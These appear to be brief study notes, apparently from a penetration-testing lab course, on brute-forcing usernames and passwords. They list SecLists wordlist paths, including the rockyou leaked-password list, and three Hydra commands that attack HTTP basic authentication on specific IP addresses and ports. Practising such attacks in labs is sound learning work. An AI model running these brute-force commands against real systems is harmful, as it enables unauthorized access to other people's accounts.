# Username Brute Force

```shell-session
/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```



```shell-session
/opt/useful/SecLists/Usernames/Names/names.txt
```

{% code overflow="wrap" %}
```
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```
{% endcode %}

{% code overflow="wrap" %}
```
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```
{% endcode %}

{% code overflow="wrap" %}
```
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 83.136.253.102 -s 51865 -u -f http-get /
```
{% endcode %}
